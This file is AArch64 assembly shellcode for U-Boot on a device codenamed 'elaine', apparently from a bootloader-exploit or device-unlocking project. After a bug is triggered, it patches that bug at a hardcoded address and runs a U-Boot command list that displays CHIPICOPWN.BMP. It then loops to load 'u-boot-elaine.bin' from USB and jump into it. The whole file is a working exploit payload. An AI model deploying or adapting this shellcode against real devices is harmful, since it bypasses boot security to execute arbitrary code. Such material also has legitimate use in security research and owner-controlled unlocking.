// elaine u-boot shellcode : loads file 'u-boot-elaine.bin' from USB drive and executes it
.text
.global _start
_start:
    sub sp, sp, #0x1000 // move SP below us to avoid being overwritten when calling functions
    ldr x0, _bug_ptr
    ldr x1, _bug_fix
    str x1, [x0]  // fix the bug we just exploited
    adr x0, _command_list
    mov w1, #0xffffffff
    mov w2, #0x0
    ldr x30, _download_buf // set LR to download buffer
    ldr x3, _run_command_list // load binary into download buffer
    br x3

_bug_ptr: .dword 0x7ff26178
_bug_fix: .dword 0xd65f03c0d2800000
_download_buf: .dword 0x01000000
_run_command_list: .dword 0x7ff24838
_command_list: .asciz "osd setcolor 0x00000000;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then exit;fi;done;"